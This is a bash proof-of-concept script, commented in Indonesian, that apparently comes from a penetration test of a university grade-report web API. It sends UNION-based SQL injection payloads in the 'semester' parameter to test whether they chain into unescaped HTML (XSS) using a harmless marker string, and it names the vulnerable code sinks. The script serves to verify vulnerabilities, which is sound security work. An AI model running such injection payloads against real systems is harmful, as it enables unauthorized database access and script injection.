#!/usr/bin/env bash
# SONAR-03 (hipotesis rangkaian S3->S4) - UNION injection di parameter semester endpoint KHS,
# untuk menaruh HTML penanda (tidak berbahaya) ke kolom i.nama yang dirender tanpa escape di <td>${i.nama}</td>.
# Sink SQLi: src/models/nilaiModel.js publishedBySemester() -> AND ks.semester = '${semester}' ... ORDER BY mk.kode
# Sink XSS:  src/controllers/nilaiController.js halamanKhs() -> <td>${i.nama}</td> tanpa escapeHtml (baris 120)
# Kriteria lolos: string '<b>POC_MARKER_7f3a</b>' muncul MENTAH (tanpa escape) di dalam <td> respons.
# Prasyarat: peran mahasiswa (andi), autentikasi diri sendiri.
set -euo pipefail
cd "$(dirname "$0")"
source ./00-login.sh
B="$BASE_URL"; ANH="Authorization: Bearer $ANDI_TOKEN"
MARK='<b>POC_MARKER_7f3a</b>'

kolom6="'2026-ganjil','KODE','${MARK}',3,'A',4.0"
coba() { # deskripsi  payload
  echo "== $1 =="
  local resp; resp=$(curl -s -m 10 -G "$B/api/nilai/me/khs" --data-urlencode "semester=$2" -H "$ANH")
  echo "  respon (200 char pertama): $(echo "$resp" | head -c 200)"
  if printf '%s' "$resp" | grep -qF "<td>${MARK}</td>"; then echo "  -> MARKER MENTAH di <td> (chain terbukti)"; return 0
  elif printf '%s' "$resp" | grep -qF 'POC_MARKER_7f3a'; then echo "  -> marker muncul tapi ter-escape/terpotong"; return 2
  else echo "  -> marker tidak muncul (kemungkinan error SQL)"; return 1; fi
}

terbukti=0
coba "Payload A: UNION + komentar baris" "x' UNION SELECT ${kolom6} --" && terbukti=1 || true
coba "Payload B: UNION SELECT ... FROM ... tutup string" "x' UNION SELECT ${kolom6} FROM mata_kuliah mk WHERE mk.kode='IF1002" && terbukti=1 || true

echo
if [ "$terbukti" = 1 ]; then
  echo "KESIMPULAN: RANGKAIAN TERBUKTI. HTML penanda muncul mentah di i.nama lewat UNION pada parameter semester."
else
  echo "KESIMPULAN: TIDAK TERBUKTI. UNION gagal (lihat respon); query diakhiri 'ORDER BY mk.kode' (kolom berkualifikasi) yang tidak valid setelah UNION, sehingga HTML tidak dapat disuntikkan ke i.nama lewat jalur ini. (SQLi boolean-based S3 tetap nyata, lihat s3-sqli-semester-khs.sh.)"
fi
